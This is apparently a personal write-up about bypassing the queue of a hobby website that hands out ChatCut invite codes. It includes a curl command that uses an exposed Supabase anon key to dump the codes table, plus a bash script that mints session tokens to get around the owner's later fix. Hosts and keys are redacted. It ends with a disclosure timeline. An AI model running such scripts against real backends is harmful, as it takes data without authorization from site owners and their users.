title: skipping queues to get codes for chatcut

we start at me scrolling through twitter and i see someone vibecoded a website for queuing in to get chatcut codes. i navigate to the website and notice a suparbase url, and a user api key in the `config.js` file found when you view the source of `index.html`. i start to think about how i could use this information to skip the queue (out of curiosity). i decide to use the user api key and the supabase url and retrieve the chatcut codes without having to wait in line via curl `curl "https://<<>>.supabase.co/rest/v1/codes?select=*" -H "apikey: <<>>" -H "Authorization: Bearer <<>>"` (information is redacted)... success. i post the results under a post on twitter:

after my discovery, i decided to contact the owner of the website on twitter:

UNTIL... i found out that the owner of the website introduced the requirement of tokens and uuids (for a valid session) but i found out that can be easily bypassed with a small python script. first, we'll get into how i found out about this. remember when the owner of the website "fixed the issue"? yeah, i looked at the new swagger api documentation and went straight to trying to find a workaround for the new patch to the issue i found earlier. after some trial and error, i managed to get five codes but not all the available ones the website reported, but they changed in large intervals, still a great discovery. now that you know about this, here is the script i came up with:

```bash
PROJECT="<<>>.supabase.co"
ANON_KEY="<<>>"

# session id
if command -v uuidgen >/dev/null 2>&1; then
  SID="$(uuidgen)"
else
  SID="$(python -c 'import uuid;print(uuid.uuid4())')"
fi

# generate queue token
TOKEN_JSON=$(curl -s -X POST "https://${PROJECT}/rest/v1/rpc/generate_queue_token" \
  -H "apikey: ${ANON_KEY}" \
  -H "Authorization: Bearer ${ANON_KEY}" \
  -H "Content-Type: application/json" \
  -d "{\"p_session_id\":\"${SID}\"}")

# extract just the token value
TOKEN=$(echo "$TOKEN_JSON" | tr -d '"')

# sanity check
echo "Token: $TOKEN"

# fetch codes
curl -s -X POST "https://${PROJECT}/rest/v1/rpc/get_codes_with_token" \
  -H "apikey: ${ANON_KEY}" \
  -H "Authorization: Bearer ${ANON_KEY}" \
  -H "Content-Type: application/json" \
  -d "{\"p_token\":\"${TOKEN}\"}"
```

timeline for this:

- feb 12 2:30 PM found info in `config.js` and started experimenting with requests via curl.
- feb 12 2:55 PM successfully retrieved chatcut codes without waiting in line and posted results on twitter.
- feb 12 3:00 PM contacted the owner of the website on twitter.
- feb 12 3:03-3:28 PM contacted the owner of the website about the issue.
- feb 12 3:40-4:56 PM issue is now resolved.
